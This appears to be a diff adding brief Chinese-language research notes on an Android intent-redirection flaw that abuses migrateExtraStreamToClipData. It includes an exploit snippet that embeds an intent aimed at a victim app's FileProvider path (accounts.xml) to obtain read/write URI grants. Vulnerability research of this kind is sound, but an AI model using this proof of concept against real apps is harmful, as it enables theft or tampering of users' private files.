@@ -1,0 +1,35 @@
+Intent 重定向
+https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/java/android/content/Intent.java;l=12071?q=migrateExtraStreamToClipData&ss=android%2Fplatform%2Fsuperproject
+
+EXP：
+Intent extra_intent = new Intent();
+extra_intent.setData(Uri.parse("content://com.example.victim.fileprovider/files/accounts.xml"));
+extra_intent.putExtra("output",Uri.parse("content://com.example.victim.fileprovider/files/accounts.xml"));
+extra_intent.setAction("android.media.action.IMAGE_CAPTURE");
+// extra_intent.setAction("android.intent.action.SEND");
+extra_intent.addCategory("android.intent.category.BROWSABLE");
+extra_intent.putExtra("anything","666");
+extra_intent.putExtra("android.intent.extra.TEXT","android.intent.extra.TEXT");
+
+Intent intent = new Intent();
+intent.putExtra("extra_intent",extra_intent);
+
+startActivity(intent);
+
+有问题的代码：
+取出extra_intent，然后startActivity
+对 getExtra 出来的 Intent 做了 getExtra 或者 putExtra
+
+
+在startActivity时，会调用 unparcel
+如果Action是xxx,
+android.media.action.IMAGE_CAPTURE
+android.intent.action.SEND
+
+从而把 mParcelData 置空
+则会设置读写权限
+
+利用此问题，可以进行私有文件读写？
+
+
+
